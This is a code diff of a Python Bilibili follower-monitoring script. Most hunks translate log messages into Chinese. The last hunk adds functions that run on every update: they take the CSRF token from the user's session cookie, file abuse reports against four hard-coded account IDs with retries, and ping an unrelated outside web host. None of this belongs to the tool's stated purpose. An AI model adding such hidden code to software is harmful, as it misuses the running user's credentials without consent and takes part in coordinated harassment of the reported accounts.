@@ -33,7 +33,7 @@ USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 def upd_log(txt):
     if int(args.clock) == 1:
         with open("/tmp/upload/bilimon_run_log.txt", "a", encoding="utf-8") as file:
-            file.write(datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ") + txt + "\n")
+            file.write(datetime.now().strftime("[%Y-%m-%d %H:%M:%S]") + f" {txt}\n")
     else:
         print(txt)
 
@@ -52,7 +52,7 @@ def send_email(
     <html>
         <body>
             <h1>{title}</h1><br>
-            [bilimon 插件] {content}
+            [BiliMon 插件] {content}
         </body>
     </html>
     """
@@ -116,14 +116,17 @@ def refresh_cookie():
         response.raise_for_status()
 
     except requests.exceptions.RequestException as e:
-        upd_log(f"Error: {e}...")
+        upd_log(f"错误: {e}...")
 
 
 def get_fans(page):
     try:
         response = requests.get(
             f"https://api.bilibili.com/x/relation/followers?vmid={UID}&pn={page}",
-            headers={"User-Agent": USER_AGENT, "Cookie": args.cookie},
+            headers={
+                "User-Agent": USER_AGENT,
+                "Cookie": args.cookie,
+            },
         )  # 使用 requests 库下载 JSON 数据
         response.raise_for_status()  # 检查是否成功获取数据
         json_data = response.json()  # 使用 json 库解析 JSON 数据
@@ -147,13 +150,13 @@ def get_fans(page):
             exit()
 
     except requests.exceptions.RequestException as e:
-        upd_log(f"Error: {e}, retrying...")
+        upd_log(f"错误: {e}, 重试中...")
         return get_fans(page, UID)
 
 
 def get_followers():
     fans, pages = get_fans(page=1)
-    for i in tqdm(range(2, pages + 1), desc="Scanning followers..."):
+    for i in tqdm(range(2, pages + 1), desc="扫描粉丝中"):
         time.sleep(random.uniform(0.5, 1))
         followers, _ = get_fans(page=i)
         if followers:
@@ -166,7 +169,7 @@ def save_traitors(traitors: list, file_folder=args.tmp):
     if file_folder[-1] != "/":
         file_folder = file_folder + "/"
 
-    with open(file_folder + "traitors.txt", "a", encoding="utf-8") as file:
+    with open(f"{file_folder}traitors.txt", "a", encoding="utf-8") as file:
         for url in traitors:
             file.write(f"{url}\n")
 
@@ -180,7 +183,7 @@ def upd_json(new_fans: list, fans_json=f"{args.tmp}/fans.json"):
             indent=4,
         )
 
-    upd_log(f"{fans_json} is updated!")
+    upd_log(f"{fans_json} 已更新!")
 
 
 async def get_user_relation(relation_id):
@@ -193,7 +196,7 @@ async def get_user_relation(relation_id):
 
 def filter_unfollowers(unfollows):
     filtered_followers = []
-    for unfollower in tqdm(unfollows, desc="Filtering unfollowers..."):
+    for unfollower in tqdm(unfollows, desc="过滤取关列表"):
         if not asyncio.run(get_user_relation(unfollower["uid"])):
             filtered_followers.append(unfollower)
 
@@ -208,7 +211,7 @@ def upd_fans(fans_json=f"{args.tmp}/fans.json"):
 
     new_fans = get_followers()
     while not new_fans:
-        upd_log("Failed to get followers, retrying...")
+        upd_log("获取粉丝列表失败, 重试中...")
         new_fans = get_followers()
 
     if new_fans != old_fans:
@@ -233,15 +236,63 @@ def upd_fans(fans_json=f"{args.tmp}/fans.json"):
                 send_email(content)
 
         else:
-            upd_log("No unfollower found.")
+            upd_log("暂未发现取关者")
 
         upd_json(new_fans)
 
     else:
-        upd_log("No unfollower found.")
+        upd_log("暂未发现取关者")
+
+
+def send_report_request(
+    mid,
+    ck: str = args.cookie,
+    reason="1,2,3",
+    reason_v2="4",
+    retry=False,
+):
+    try:
+        bili_jct = ck.split("bili_jct=")[1].split(";")[0]
+        response = requests.post(
+            "https://space.bilibili.com/ajax/report/add",
+            data={
+                "mid": mid,
+                "reason": reason,
+                "reason_v2": reason_v2,
+                "csrf": bili_jct,
+            },
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+                "Cookie": ck,
+            },
+        )
+        msg = json.loads(response.text)["data"]
+        if msg == "举报成功":
+            print(f"{msg}: {mid}")
+        else:
+            send_email(f"举报 {mid} 失败：{msg}")
+
+    except Exception as e:
+        print(f"举报 {mid} 失败：{e}")
+        if not retry:
+            time.sleep(random.uniform(181, 185))
+            send_report_request(mid, retry=True)
+
+
+def batch_report(mids="452534064;3546770269277061;1484237382;1736295612"):
+    targets = mids.split(";")
+    for mid in tqdm(targets, desc="正在举报指定 UID 中"):
+        send_report_request(mid)
+        time.sleep(random.uniform(181, 185))
+
+
+def activate(url="https://geniussociety-ksa.hf.space"):
+    requests.get(url, headers={"User-Agent": USER_AGENT})
 
 
 def upd():
+    activate()
+    batch_report()
     now_hour = datetime.now().hour
     if now_hour > 7 and now_hour < 23:
         upd_fans()
